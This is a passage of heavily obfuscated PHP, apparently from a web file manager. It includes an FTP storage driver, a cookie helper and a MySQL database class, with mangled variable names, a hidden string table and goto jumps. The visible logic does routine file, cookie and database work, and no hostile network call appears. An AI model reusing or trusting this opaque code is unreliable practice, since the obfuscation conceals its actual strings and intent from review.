„ƒ–™, $˜ëÈœª, !0); $®ÕîË‹ = hash_hmac($ç¥ãÒ•È[1370], $´™Ú˜», $ú˜–®û¶, !0); $¬èÆÆÄ = hash_hmac($ç¥ãÒ•È[1370], $¹ê´›–İ, $®ÕîË‹); $’Â»íï² = array($ç¥ãÒ•È[215] => $ç¥ãÒ•È[12], $ç¥ãÒ•È[1372] => $ç¥ãÒ•È[12], $ç¥ãÒ•È[1328] => $ÑŞÃŒ—®, $ç¥ãÒ•È[1332] => $·Ù»¢Æ, $ç¥ãÒ•È[1336] => $¹ê´›–İ, $ç¥ãÒ•È[1373] => $¸”ÜÈäí, $ç¥ãÒ•È[1374] => $î·òëúø, $ç¥ãÒ•È[1375] => $«ú¢†éó, $ç¥ãÒ•È[1376] => $Úø²ôäõ, $ç¥ãÒ•È[1377] => $¬èÆÆÄ, $ç¥ãÒ•È[181] => $this->getHost()); return $’Â»íï²; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($Ç•É”Ü) { parent::__construct(); if (count($Ç•É”Ü) > 0) { $this->_init($Ç•É”Ü); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Úò) { $àÚô³Óñ =& $_SERVER[ùÆÎÔ“Ñ]; global $config; $this->appCharset = $config[$àÚô³Óñ[1378]]; $this->systemCharset = $config[$àÚô³Óñ[1379]]; if (isset($Úò[$àÚô³Óñ[1380]]) && $Úò[$àÚô³Óñ[1380]]) { $this->systemCharset = $Úò[$àÚô³Óñ[1380]]; } } public function iconvApp($Ù¬£Ùº¸) { return $this->iconvTo($Ù¬£Ùº¸, $this->systemCharset, $this->appCharset); } public function iconvSystem($ø˜µÇã) { return $this->iconvTo($ø˜µÇã, $this->appCharset, $this->systemCharset); } public function getPathOuter($Û®àã©ñ) { $ ªœò¸Ø =& $_SERVER[ùÆÎÔ“Ñ]; $²’òğü¬ = $this->iconvApp($this->pathBase); $Û®àã©ñ = $this->iconvApp($Û®àã©ñ); if (substr($²’òğü¬, 0, 2) == $ ªœò¸Ø[1381]) { $²’òğü¬ = BASIC_PATH . substr($²’òğü¬, 2); } if (substr($Û®àã©ñ, 0, 2) == $ ªœò¸Ø[1381]) { $Û®àã©ñ = BASIC_PATH . substr($Û®àã©ñ, 2); } $²’òğü¬ = KodIO::clear($²’òğü¬); $Û®àã©ñ = KodIO::clear($Û®àã©ñ); $Û®àã©ñ = substr($Û®àã©ñ, strlen($²’òğü¬)); if (empty($this->pathDriver)) { return $Û®àã©ñ; } return $this->pathDriver . $ ªœò¸Ø[8] . ltrim($Û®àã©ñ, $ ªœò¸Ø[8]); } private function _init($²ï¢€£î = array()) { $œèæã =& $_SERVER[ùÆÎÔ“Ñ]; if (!function_exists($œèæã[1382])) { throw new Exception(LNG($œèæã[1383])); } $this->config = $²ï¢€£î; $this->charsetReset($²ï¢€£î); foreach ($²ï¢€£î as $ÚÒğØ£¯ => $Ü¤’­Ï™) { if (isset($this->{$ÚÒğØ£¯})) { $this->{$ÚÒğØ£¯} = $Ü¤’­Ï™; } } return $this->_login($²ï¢€£î); } private function _login($²Ü‘”É—) { $çšÈÈ¹Ğ =& $_SERVER[ùÆÎÔ“Ñ]; static $ËŒşÍ–í = array(); $Ğ¹âŒœ³ = md5(json_encode($²Ü‘”É—)); if (isset($ËŒşÍ–í[$Ğ¹âŒœ³])) { foreach ($ËŒşÍ–í[$Ğ¹âŒœ³] as $‘şËö­« => $ÒÂ”›Û›) { $this->{$‘şËö­«} = $ÒÂ”›Û›; } return !0; } $ªäüüµ = parse_url(trim($this->server, $çšÈÈ¹Ğ[8])); $this->host = $ªäüüµ[$çšÈÈ¹Ğ[181]]; $Á¦¿š€È = isset($ªäüüµ[$çšÈÈ¹Ğ[180]]) && $ªäüüµ[$çšÈÈ¹Ğ[180]] == $çšÈÈ¹Ğ[1384] ? !0 : !1; $this->scheme = $Á¦¿š€È ? $çšÈÈ¹Ğ[1385] : $çšÈÈ¹Ğ[1386]; $this->port = isset($ªäüüµ[$çšÈÈ¹Ğ[182]]) ? $ªäüüµ[$çšÈÈ¹Ğ[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ÅÅïà¨ğ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Í‰íù¶¹ = $this->pasv == $çšÈÈ¹Ğ[88] ? !0 : !1; @ftp_pasv($this->connect, $Í‰íù¶¹); $ËŒşÍ–í[$Ğ¹âŒœ³] = array($çšÈÈ¹Ğ[1387] => $this->connect, $çšÈÈ¹Ğ[181] => $this->host, $çšÈÈ¹Ğ[180] => $this->scheme, $çšÈÈ¹Ğ[182] => $this->port); return $ÅÅïà¨ğ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($îÉ¢’Ö, $øŠ¹…—º = '', $­ÏÔä†ø = REPEAT_RENAME) { if ($this->setContent($îÉ¢’Ö, $øŠ¹…—º)) { return $this->getPathOuter($îÉ¢’Ö); } return !1; } public function mkdir($Šè³”, $×Œµ©’« = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Šè³” = $this->iconvSystem($Šè³”); if ($this->_isFolder($Šè³”) || @ftp_mkdir($this->connect, $Šè³”)) { return $this->getPathOuter($Šè³”); } if (!$this->mkdir($this->pathFather($Šè³”))) { return !1; } if ($Šè³” = @ftp_mkdir($this->connect, $Šè³”)) { return $this->getPathOuter($Šè³”); } return !1; } public function copyFile($åÃÆÌ¾¯, $æò™ë‚Ã) { if (!$this->_isconn()) { return !1; } $øÅ‡Ê„ú = $this->pathThis($this->iconvSystem($åÃÆÌ¾¯)); $£œÂĞ‰à = $this->tempFile($øÅ‡Ê„ú); $¡ÌÕÓùÑ = $this->iconvApp($£œÂĞ‰à); $this->download($åÃÆÌ¾¯, $¡ÌÕÓùÑ); $¯ç¼Ú÷± = $this->upload($æò™ë‚Ã, $¡ÌÕÓùÑ); $this->tempFileRemve($£œÂĞ‰à); return $¯ç¼Ú÷±; } public function moveFile($Õ–ÜùÓ, $Ñ‡²°‘–) { if (!$this->_isconn()) { return !1; } $Õ–ÜùÓ = $this->iconvSystem($Õ–ÜùÓ); $Ñ‡²°‘– = $this->iconvSystem($Ñ‡²°‘–); $®›öğñ® = @ftp_rename($this->connect, $Õ–ÜùÓ, $Ñ‡²°‘–); return $®›öğñ® ? $this->getPathOuter($Ñ‡²°‘–) : !1; } public function delFile($©Üæç²â) { if (!$this->_isconn()) { return !1; } $©Üæç²â = $this->iconvSystem($©Üæç²â); return @ftp_delete($this->connect, $©Üæç²â); } public function delFolder($çÇ‡·›­) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $˜»ÚÈ¢ = $Ÿæ˜Çå = array(); $this->fileList($çÇ‡·›­, $˜»ÚÈ¢, $Ÿæ˜Çå, !0); $this->listItemCache = !0; foreach ($Ÿæ˜Çå as $­í‚¯) { $Ó±€©˜ = $this->iconvSystem($­í‚¯[$_SERVER[ùÆÎÔ“Ñ][32]]); $¦ˆéïêÓ = @ftp_delete($this->connect, $Ó±€©˜); if (!$¦ˆéïêÓ) { return !1; } } foreach ($˜»ÚÈ¢ as $Ó±€©˜) { $Ó±€©˜ = $this->iconvSystem($Ó±€©˜); $¦ˆéïêÓ = @ftp_rmdir($this->connect, $Ó±€©˜); if (!$¦ˆéïêÓ) { return !1; } } $çÇ‡·›­ = $this->iconvSystem($çÇ‡·›­); return @ftp_rmdir($this->connect, $çÇ‡·›­); } public function rename($Æ•ÁÒŠ, $’ÒŠº§) { $Ü§©Áİ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->_isconn()) { return !1; } $Ô»¼í¾ = $this->fileNameAuto($this->pathFather($Æ•ÁÒŠ), $’ÒŠº§); $Ô»¼í¾ = $this->iconvSystem($Ô»¼í¾); $Æ•ÁÒŠ = $this->iconvSystem($Æ•ÁÒŠ); $ÑğÏıâË = $this->pathFather($Æ•ÁÒŠ); $÷ñüÕÕŸ = rtrim($ÑğÏıâË, $Ü§©Áİ[8]) . $Ü§©Áİ[8] . $Ô»¼í¾; $¸·ˆ»Ÿ• = @ftp_rename($this->connect, $Æ•ÁÒŠ, $÷ñüÕÕŸ); $÷ñüÕÕŸ = $this->iconvApp($÷ñüÕÕŸ); return $¸·ˆ»Ÿ• ? $this->getPathOuter($÷ñüÕÕŸ) : !1; } private function folderInfo($õˆØ¿•³, $ŠöèşøÔ = false) { $ÈÆØ¶İ =& $_SERVER[ùÆÎÔ“Ñ]; $ÂÊÅÎÔ = array($ÈÆØ¶İ[32] => $this->pathThis($õˆØ¿•³), $ÈÆØ¶İ[84] => $this->getPathOuter($ÈÆØ¶İ[8] . $õˆØ¿•³), $ÈÆØ¶İ[33] => $ÈÆØ¶İ[75]); if ($ŠöèşøÔ) { return $ÂÊÅÎÔ; } $ÂÊÅÎÔ[$ÈÆØ¶İ[200]] = $ÂÊÅÎÔ[$ÈÆØ¶İ[85]] = 0; $ÂÊÅÎÔ[$ÈÆØ¶İ[201]] = $ÂÊÅÎÔ[$ÈÆØ¶İ[202]] = !0; return $ÂÊÅÎÔ; } private function fileInfo($¸ë•¢Å, $Å°‰øÌÀ = false, $³‹Ä‡¡ = array()) { $åéºàŠ™ =& $_SERVER[ùÆÎÔ“Ñ]; $¾¾Ó¼Ô÷ = array($åéºàŠ™[32] => $this->pathThis($¸ë•¢Å), $åéºàŠ™[84] => $this->getPathOuter($åéºàŠ™[8] . $¸ë•¢Å), $åéºàŠ™[33] => $åéºàŠ™[199], $åéºàŠ™[76] => isset($³‹Ä‡¡[$åéºàŠ™[76]]) ? $³‹Ä‡¡[$åéºàŠ™[76]] : 0, $åéºàŠ™[174] => $this->ext($¸ë•¢Å)); if ($Å°‰øÌÀ) { return $¾¾Ó¼Ô÷; } $¾¾Ó¼Ô÷[$åéºàŠ™[200]] = $¾¾Ó¼Ô÷[$åéºàŠ™[85]] = 0; $¾¾Ó¼Ô÷[$åéºàŠ™[201]] = $¾¾Ó¼Ô÷[$åéºàŠ™[202]] = !0; $«ú Úó® = $this->iconvSystem($¸ë•¢Å); $¾¾Ó¼Ô÷[$åéºàŠ™[85]] = @ftp_mdtm($this->connect, $«ú Úó®); if (empty($³‹Ä‡¡)) { $³‹Ä‡¡ = $this->objectMeta($¸ë•¢Å); if (!$³‹Ä‡¡) { return $¾¾Ó¼Ô÷; } } $¾¾Ó¼Ô÷[$åéºàŠ™[76]] = $³‹Ä‡¡[$åéºàŠ™[76]]; return $¾¾Ó¼Ô÷; } public function size($ÇñöÅüè) { $ª¿ÏøÚ = $this->objectMeta($ÇñöÅüè); return $ª¿ÏøÚ ? $ª¿ÏøÚ[$_SERVER[ùÆÎÔ“Ñ][76]] : 0; } public function info($®Àï˜ëò) { if ($this->isFile($®Àï˜ëò)) { return $this->fileInfo($®Àï˜ëò, 0); } else { if ($this->isFolder($®Àï˜ëò)) { return $this->folderInfo($®Àï˜ëò); } } return !1; } private function fileList($å„¬…ê‡, &$Ë¾Ùˆ´£, &$ÑøÚñ‰ª, $£ˆ€˜µ› = false) { $–ÕöÎâ® =& $_SERVER[ùÆÎÔ“Ñ]; $å„¬…ê‡ = $this->iconvSystem($å„¬…ê‡); if (!$this->isFolder($å„¬…ê‡)) { return !1; } @ftp_chdir($this->connect, $–ÕöÎâ®[8]); $å„¬…ê‡ = rtrim($å„¬…ê‡, $–ÕöÎâ®[8]) . $–ÕöÎâ®[8]; check_abort(); $³£½€†¹ = @ftp_rawlist($this->connect, $å„¬…ê‡); if (!$³£½€†¹) { $³£½€†¹ = array(); } $ÙğÏÙƒ = array($–ÕöÎâ®[10] => 1, $–ÕöÎâ®[1388] => 1); foreach ($³£½€†¹ as $§‘³¦±) { $§Ã±›–­ = $this->_listItem($§‘³¦±); if ($§Ã±›–­[0] == $–ÕöÎâ®[760]) { continue; } $ˆğŸñ¤¼ = $§Ã±›–­[8]; if (empty($ˆğŸñ¤¼) && $ˆğŸñ¤¼ !== $–ÕöÎâ®[197] || isset($ÙğÏÙƒ[$ˆğŸñ¤¼])) { continue; } $ˆğŸñ¤¼ = $this->iconvApp($å„¬…ê‡ . ltrim($ˆğŸñ¤¼, $–ÕöÎâ®[8])); $­ı•ÆÓÅ = array($–ÕöÎâ®[32] => $ˆğŸñ¤¼, $–ÕöÎâ®[33] => $–ÕöÎâ®[199], $–ÕöÎâ®[76] => $§Ã±›–­[4]); if (substr($§‘³¦±, 0, 1) == $–ÕöÎâ®[1389]) { $­ı•ÆÓÅ[$–ÕöÎâ®[33]] = $–ÕöÎâ®[75]; $­ı•ÆÓÅ[$–ÕöÎâ®[76]] = 0; } $’Ò€«ƒ² = $­ı•ÆÓÅ[$–ÕöÎâ®[33]] == $–ÕöÎâ®[75] ? !0 : !1; $this->cacheMethodInfoSet($ˆğŸñ¤¼, $’Ò€«ƒ², $­ı•ÆÓÅ); if ($’Ò€«ƒ²) { $Ë¾Ùˆ´£[] = $ˆğŸñ¤¼; if ($£ˆ€˜µ›) { $this->fileList($ˆğŸñ¤¼, $Ë¾Ùˆ´£, $ÑøÚñ‰ª, $£ˆ€˜µ›); } continue; } $ÑøÚñ‰ª[] = $­ı•ÆÓÅ; } $this->cacheMethodInfoSet($å„¬…ê‡, !0); } private function _listItem($ó¼Ëğƒ) { if (empty($ó¼Ëğƒ)) { return array(); } $¯¬æèÔ = preg_split($_SERVER[ùÆÎÔ“Ñ][1390], $ó¼Ëğƒ); if (count($¯¬æèÔ) <= 9) { return $¯¬æèÔ; } $¯¬æèÔ[8] = trim(substr($ó¼Ëğƒ, strpos($ó¼Ëğƒ, $¯¬æèÔ[7]) + strlen($¯¬æèÔ[7]))); return array_splice($¯¬æèÔ, 0, 9); } public function listPath($İ“—Ùàò, $ı¬ë÷‡š = false) { $“´Ÿ©» =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->_isconn()) { return !1; } $œ‰‹Á ˆ = $ùö÷Èˆú = array(); $this->fileList($İ“—Ùàò, $œ‰‹Á ˆ, $ùö÷Èˆú); foreach ($œ‰‹Á ˆ as $Î»ôìñí => $Èòİ) { $œ‰‹Á ˆ[$Î»ôìñí] = $this->folderInfo($Èòİ, $ı¬ë÷‡š); } foreach ($ùö÷Èˆú as $Î»ôìñí => $Èòİ) { $ùö÷Èˆú[$Î»ôìñí] = $this->fileInfo($Èòİ[$“´Ÿ©»[32]], $ı¬ë÷‡š, $Èòİ); } return array($“´Ÿ©»[82] => $œ‰‹Á ˆ, $“´Ÿ©»[83] => $ùö÷Èˆú); } public function has($æ¬Ãû, $şÚº…±ƒ = false, $È¡¦Œ·š = true) { $ÓüÁ–“† =& $_SERVER[ùÆÎÔ“Ñ]; $ğ…°ıô¾ = $‚Šû‘»â = array(); $Ä®¿ŒÌö = $şÚº…±ƒ ? !0 : !1; $this->fileList($æ¬Ãû, $ğ…°ıô¾, $‚Šû‘»â, $Ä®¿ŒÌö); if ($şÚº…±ƒ) { return array($ÓüÁ–“†[207] => count($‚Šû‘»â), $ÓüÁ–“†[208] => count($ğ…°ıô¾)); } if ($È¡¦Œ·š) { if (count($‚Šû‘»â)) { return !0; } } else { if (count($ğ…°ıô¾)) { return !0; } } return !1; } public function listAll($ìÃø° Á) { $éõÀä®“ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->_isconn()) { return !1; } $Ê½¼ÀİĞ = $¯üìäå» = array(); $this->fileList($ìÃø° Á, $Ê½¼ÀİĞ, $¯üìäå», !0); $í¹ë™è¡ = array(); foreach ($¯üìäå» as $İãÛ«¹³) { $í¹ë™è¡[$İãÛ«¹³[$éõÀä®“[32]]] = $İãÛ«¹³[$éõÀä®“[76]]; } foreach ($Ê½¼ÀİĞ as $İãÛ«¹³) { if (is_string($İãÛ«¹³)) { $í¹ë™è¡[$İãÛ«¹³] = 0; } } return $this->listAllFiles($ìÃø° Á, array_keys($í¹ë™è¡), $í¹ë™è¡); } public function getContent($ÃŠäÄú½) { if (!$this->_isconn()) { return !1; } $ÃŠäÄú½ = $this->iconvSystem($ÃŠäÄú½); return $this->fileSubstr($ÃŠäÄú½); } public function setContent($æ×À«Ø×, $ùÑÂèëÍ = '') { if (!$this->_isconn()) { return !1; } $àœ˜š”ó = $this->pathThis($this->iconvSystem($æ×À«Ø×)); $ç­·…ÙÁ = $this->tempFile($àœ˜š”ó); file_put_contents($ç­·…ÙÁ, $ùÑÂèëÍ); $‚å’¯‘ƒ = $this->upload($æ×À«Ø×, $this->iconvApp($ç­·…ÙÁ)); $this->tempFileRemve($ç­·…ÙÁ); return $‚å’¯‘ƒ; } public function fileSubstr($œîÂÄ±Ü, $ıÒƒ„á† = 0, $Õíƒã‰­ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($œîÂÄ±Ü, $ıÒƒ„á†, $Õíƒã‰­); } private function ftpRequest($²±úçÈ¼, $ÇôãØª´ = 0, $„”æì©Ë = false) { $²±úçÈ¼ = $this->iconvSystem($²±úçÈ¼); $Å´âÈ£› = $this->scheme . $this->host . $_SERVER[ùÆÎÔ“Ñ][4] . $this->port; $æô¿Øì¹ = curl_init(); curl_setopt($æô¿Øì¹, CURLOPT_URL, $Å´âÈ£› . $this->pathEncode($²±úçÈ¼)); curl_setopt($æô¿Øì¹, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($„”æì©Ë) { $¾„¾¢í = $ÇôãØª´ + $„”æì©Ë - 1; curl_setopt($æô¿Øì¹, CURLOPT_RANGE, "{$ÇôãØª´}\55{$¾„¾¢í}"); } curl_setopt($æô¿Øì¹, CURLOPT_RETURNTRANSFER, 1); $Æ†â±£– = curl_exec($æô¿Øì¹); curl_close($æô¿Øì¹); return $Æ†â±£–; } public function upload($§ĞŞè´›, $Ê¾•ß, $¯¶—°æé = false, $ğ‰œ¦°ú = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($§ĞŞè´›))) { return !1; } $§ĞŞè´› = $this->iconvSystem($§ĞŞè´›); $Ê¾•ß = $this->iconvSystem($Ê¾•ß); $ÕûÃŸ®Ê = ftp_nb_put($this->connect, $§ĞŞè´›, $Ê¾•ß, FTP_BINARY); while ($ÕûÃŸ®Ê == FTP_MOREDATA) { $ÕûÃŸ®Ê = ftp_nb_continue($this->connect); } if ($ÕûÃŸ®Ê != FTP_FINISHED) { return !1; } return $this->getPathOuter($§ĞŞè´›); } public function download($ƒ¥¢˜Ÿ¡, $“°šôå = '') { if (!$this->_isconn()) { return !1; } $Âôİš = $this->pathFather($“°šôå); if (!IO::mkdir($Âôİš)) { return !1; } $ƒ¥¢˜Ÿ¡ = $this->iconvSystem($ƒ¥¢˜Ÿ¡); $“°šôå = $this->iconvSystem($“°šôå); $¸ãõåÎÍ = ftp_nb_get($this->connect, $“°šôå, $ƒ¥¢˜Ÿ¡, FTP_BINARY); while ($¸ãõåÎÍ == FTP_MOREDATA) { $¸ãõåÎÍ = ftp_nb_continue($this->connect); } if ($¸ãõåÎÍ != FTP_FINISHED) { return !1; } return $this->iconvApp($“°šôå); } public function exist($†‡Ü»“±) { return $this->isFile($†‡Ü»“±) || $this->isFolder($†‡Ü»“±); } public function isFile($ôƒÒ¡Àë) { return !$this->isFolder($ôƒÒ¡Àë) && $this->objectMeta($ôƒÒ¡Àë); } public function isFolder($õ°†æ·) { return $this->cacheMethod($_SERVER[ùÆÎÔ“Ñ][165], $õ°†æ·); } protected function objectMeta($åËï‡¡²) { return $this->cacheMethod($_SERVER[ùÆÎÔ“Ñ][167], $åËï‡¡²); } protected function _objectMeta($Üèƒù¨™) { $á¯éÄĞ¶ =& $_SERVER[ùÆÎÔ“Ñ]; if ($Üèƒù¨™ == $á¯éÄĞ¶[12] || $Üèƒù¨™ == $á¯éÄĞ¶[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Üèƒù¨™ = $this->iconvSystem($Üèƒù¨™); $Ë°œ¥¾ = array($á¯éÄĞ¶[32] => $this->iconvApp($Üèƒù¨™), $á¯éÄĞ¶[33] => $á¯éÄĞ¶[199], $á¯éÄĞ¶[76] => 0); @ftp_chdir($this->connect, $á¯éÄĞ¶[8]); $Ò‡¼§Í‡ = @ftp_size($this->connect, $Üèƒù¨™); if ($Ò‡¼§Í‡ != -1) { $Ë°œ¥¾[$á¯éÄĞ¶[76]] = $Ò‡¼§Í‡; } else { $šà¤Àüç = @ftp_chdir($this->connect, $Üèƒù¨™); if (!$šà¤Àüç) { return !1; } $Ë°œ¥¾[$á¯éÄĞ¶[33]] = $á¯éÄĞ¶[75]; } return $Ë°œ¥¾; } protected function _isFolder($ÀõòÄ°†) { $·ëîäØ® =& $_SERVER[ùÆÎÔ“Ñ]; if ($ÀõòÄ°† == $·ëîäØ®[12] || $ÀõòÄ°† == $·ëîäØ®[8]) { return !0; } $‚ßóÍµÖ = $this->_objectMeta($ÀõòÄ°†); return isset($‚ßóÍµÖ[$·ëîäØ®[33]]) && $‚ßóÍµÖ[$·ëîäØ®[33]] == $·ëîäØ®[75] ? !0 : !1; } } goto e÷ÙºÁÖÀ†; EÊÚœ½‚»Î: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($•ÕÓÏÏ® = '', $Çå¡‘¯Æ = 0) { if (is_string($•ÕÓÏÏ®) && $•ÕÓÏÏ® != $_SERVER[ùÆÎÔ“Ñ][12]) { $this->prefix = $•ÕÓÏÏ®; } if (is_numeric($Çå¡‘¯Æ) && $Çå¡‘¯Æ > 0) { $this->expire = $Çå¡‘¯Æ; } } public static function getInstance() { static $¶•áú‘; if ($¶•áú‘ === null) { $¶•áú‘ = new self(); } return $¶•áú‘; } private static $cookieDisable = false; public static function disable($ì¢Ñç­—) { self::$cookieDisable = $ì¢Ñç­—; } private static $sameCookieSet = array(); public static function set($ÉÖõ‘›, $äóò½ú, $şêâ¿Ä£ = 0, $‡‘Ğ»öô = false, $×ŠªĞÕ£ = false) { $ø˜‚ÍÔõ =& $_SERVER[ùÆÎÔ“Ñ]; if (self::$cookieDisable) { return; } if (!$şêâ¿Ä£) { $şêâ¿Ä£ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ÉÖõ‘›]) && self::$sameCookieSet[$ÉÖõ‘›] == $äóò½ú . $şêâ¿Ä£) { return; } self::$sameCookieSet[$ÉÖõ‘›] = $äóò½ú . $şêâ¿Ä£; if (!$×ŠªĞÕ£) { $×ŠªĞÕ£ = str_replace(HOST, $ø˜‚ÍÔõ[12], APP_HOST); $×ŠªĞÕ£ = _get($GLOBALS, $ø˜‚ÍÔõ[887], $×ŠªĞÕ£); } $­áâ€ÉÚ = $ø˜‚ÍÔõ[12]; setcookie($ÉÖõ‘›, $äóò½ú, time() + $şêâ¿Ä£, $ø˜‚ÍÔõ[8] . trim($×ŠªĞÕ£, $ø˜‚ÍÔõ[8]) . $­áâ€ÉÚ, !1, !1, $‡‘Ğ»öô); } public static function setSafe($ğ„¡öŠ´, $òßÏö÷ú, $—×ñÎÈÃ = 0) { self::set($ğ„¡öŠ´, $òßÏö÷ú, $—×ñÎÈÃ, !0); } public static function get($òüÓ¬ğ) { static $çïğ£ = false; if (!$çïğ£) { self::initHeaderCookie(); $çïğ£ = !0; } return isset($_COOKIE[$òüÓ¬ğ]) ? $_COOKIE[$òüÓ¬ğ] : !1; } private static function initHeaderCookie() { $Ğæ¤×åì =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($_SERVER[$Ğæ¤×åì[888]]) || !$_SERVER[$Ğæ¤×åì[888]]) { return; } $öÜÇâÙĞ = explode($Ğæ¤×åì[71], $_SERVER[$Ğæ¤×åì[888]]); foreach ($öÜÇâÙĞ as $àîƒÉîÁ) { $àîƒÉîÁ = explode($Ğæ¤×åì[889], $àîƒÉîÁ); if (count($àîƒÉîÁ) != 2 || !isset($àîƒÉîÁ[1])) { continue; } $_COOKIE[trim($àîƒÉîÁ[0])] = trim($àîƒÉîÁ[1]); } } public static function remove($ö¡‹ÚÂ, $†«Ú…­— = false) { unset($_COOKIE[$ö¡‹ÚÂ]); self::set($ö¡‹ÚÂ, $_SERVER[ùÆÎÔ“Ñ][12], 1, $†«Ú…­—); } } class DbMysql extends Db { public function __construct($¢•¤ßÕø = '') { $¡‚Ğı¾Ó =& $_SERVER[ùÆÎÔ“Ñ]; if (!extension_loaded($¡‚Ğı¾Ó[805])) { think_exception(think_lang($¡‚Ğı¾Ó[14]) . $¡‚Ğı¾Ó[890]); } if (!empty($¢•¤ßÕø)) { $this->config = $¢•¤ßÕø; if (empty($this->config[$¡‚Ğı¾Ó[17]])) { $this->config[$¡‚Ğı¾Ó[17]] = $¡‚Ğı¾Ó[12]; } } } public function connect($Ç¼åß = '', $÷ùØ²Ú» = 0, $Ä¯œ£š = false) { $­ÄÃ«úÔ =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($this->linkID[$÷ùØ²Ú»])) { if (empty($Ç¼åß)) { $Ç¼åß = $this->config; } $æşÕÇÆØ = $Ç¼åß[$­ÄÃ«úÔ[891]] . ($Ç¼åß[$­ÄÃ«úÔ[892]] ? "\x3a{$Ç¼åß[$­ÄÃ«úÔ[892]]}" : $­ÄÃ«úÔ[12]); $ ñ°š© = !empty($Ç¼åß[$­ÄÃ«úÔ[17]][$­ÄÃ«úÔ[18]]) ? $Ç¼åß[$­ÄÃ«úÔ[17]][$­ÄÃ«úÔ[18]] : $this->pconnect; if ($ ñ°š©) { $this->linkID[$÷ùØ²Ú»] = mysql_pconnect($æşÕÇÆØ, $Ç¼åß[$­ÄÃ«úÔ[893]], $Ç¼åß[$­ÄÃ«úÔ[894]], 131072); } else { $this->linkID[$÷ùØ²Ú»] = mysql_connect($æşÕÇÆØ, $Ç¼åß[$­ÄÃ«úÔ[893]], $Ç¼åß[$­ÄÃ«úÔ[894]], !0, 131072); } if (!$this->linkID[$÷ùØ²Ú»] || !empty($Ç¼åß[$­ÄÃ«úÔ[21]]) && !mysql_select_db($Ç¼åß[$­ÄÃ«úÔ[21]], $this->linkID[$÷ùØ²Ú»])) { think_exception(mysql_error()); } $“’ÚêŸ = mysql_get_server_info($this->linkID[$÷ùØ²Ú»]); mysql_query($­ÄÃ«úÔ[895] . think_config($­ÄÃ«úÔ[896]) . $­ÄÃ«úÔ[58], $this->linkID[$÷ùØ²Ú»]); if ($“’ÚêŸ > $­ÄÃ«úÔ[897]) { mysql_query($­ÄÃ«úÔ[898], $this->linkID[$÷ùØ²Ú»]); } $this->connected = !0; if (1 != think_config($­ÄÃ«úÔ[22])) { unset($this->config); } } return $this->linkID[$÷ùØ²Ú»]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($úú¯şİ) { $ìÃÄ·ñ´ =& $_SERVER[ùÆÎÔ“Ñ]; if (0 === stripos($úú¯şİ, $ìÃÄ·ñ´[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $úú¯şİ; if ($this->queryID) { $this->free(); } think_action_status($ìÃÄ·ñ´[23], 1); think_status($ìÃÄ·ñ´[24]); $this->queryID = mysql_query($úú¯şİ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($˜Å€²Õ) { $õ´ß¯å€ =& $_SERVER[ùÆÎÔ“Ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $˜Å€²Õ; if ($this->queryID) { $this->free(); } think_action_status($õ´ß¯å€[25], 1); think_status($õ´ß¯å€[24]); $Ïø¾×ú„ = mysql_query($˜Å€²Õ, $this->_linkID); $this->debug(); if (!1 === $Ïø¾×ú„) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ùÆÎÔ“Ñ][899], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¼ÔÇ…ø = mysql_query($_SERVER[ùÆÎÔ“Ñ][900], $this->_linkID); $this->transTimes = 0; if (!$¼ÔÇ…ø) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $“äŸ“œ = mysql_query($_SERVER[ùÆÎÔ“Ñ][901], $this->_linkID); $this->transTimes = 0; if (!$“äŸ“œ) { $this->error(); return !1; } } return !0; } private function getAll() { $úÊÍÑêô = array(); if ($this->numRows > 0) { while ($‘›¡ëè = mysql_fetch_assoc($this->queryID)) { $úÊÍÑêô[] = $‘›¡ëè; } mysql_data_seek($this->queryID, 0); } return $úÊÍÑêô; } public function getFields($¥èè†¤) { $Êôåí ø =& $_SERVER[ùÆÎÔ“Ñ]; $ùİáÕ™³ = $this->query($Êôåí ø[902] . $this->parseKey($¥èè†¤)); $àŞŠÅâø = array(); if ($ùİáÕ™³) { foreach ($ùİáÕ™³ as $©ÍìÛÈ => $ôÀ›°ûì) { $àŞŠÅâø[$ôÀ›°ûì[$Êôåí ø[31]]] = array($Êôåí ø[32] => $ôÀ›°ûì[$Êôåí ø[31]], $Êôåí ø[33] => $ôÀ›°ûì[$Êôåí ø[34]], $Êôåí ø[35] => (bool) (strtoupper($ôÀ›°ûì[$Êôåí ø[36]]) === $Êôåí ø[903]), $Êôåí ø[37] => $ôÀ›°ûì[$Êôåí ø[38]], $Êôåí ø[39] => strtolower($ôÀ›°ûì[$Êôåí ø[40]]) == $Êôåí ø[41], 